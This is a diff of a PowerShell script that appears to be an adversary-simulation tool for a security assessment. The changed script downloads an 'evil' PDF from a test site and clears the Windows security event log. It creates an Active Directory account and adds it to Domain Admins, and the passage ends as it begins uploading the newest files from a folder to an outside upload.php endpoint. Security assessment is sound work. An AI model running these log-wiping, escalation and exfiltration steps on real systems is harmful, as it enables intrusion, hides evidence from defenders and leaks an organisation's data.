@@ -8,6 +8,7 @@ $UploadURI = ($TPPSecurityTestSite + "upload.php")
 $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
 Write-Host $username
+#Check if the tpp folder exists
 if (Test-Path $FolderName) {
     Write-Host "TPP folder exists"
 }
@@ -16,14 +17,21 @@ else
     New-Item $FolderName -ItemType Directory
     Write-Host "TPP folder created"
 }
-#Create a file for this test
-if (Test-Path ($FolderName + $FileName))
+#Check if the exfiltrate subfolder is there
+if (Test-Path ($FolderName + $ExfiltrateFolder)) {
+    Write-Host "Exfiltrate folder exists"
+}
+else {
+    New-Item ($FolderName + $ExfiltrateFolder) -ItemType Directory
+}
+#Create an empty ps1 file for this test
+if (Test-Path ($FolderName + $HiddenPSFileName))
 {
     Write-Host "evil.ps1 exists"
 }
 else
 {
-    New-Item ($FolderName + $FileName)
+    New-Item ($FolderName + $HiddenPSFileName)
 }
 
 
@@ -43,12 +51,12 @@ Start-BitsTransfer -Source ($TPPSecurityTestSite + $EvilPDF) -Destination ($Fold
 "wevtutil clear-log security" | cmd
 
 #Check for escalation
-"net user /add tpp_test_user_please_delete TppGlobalServices1234%" | cmd
-"net localgroup Administrators tpp_test_user_please_delete /add" | cmd
-"net group 'Domain Admins' tpp_test_user_please_delete /add /domain" | cmd
+$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String TppTestPasswordS3cur!ty
+New-ADUser -Name "TPPSecurityTest" -Description "An account added during the TPP security assessment.  Please delete!" -Enabled $true -AccountPassword $PASSWORD
+Add-ADGroupMember -Identity "Domain Admins" -Members TPPSecurityTest
 
 #Exfiltrate files
-Get-ChildItem ($FolderName + $ExfiltrateFolder) |
+Get-ChildItem ($FolderName + $ExfiltrateFolder) | Select-Object -last 10 |
 ForEach-Object {
     
    $fieldName = 'upfile'
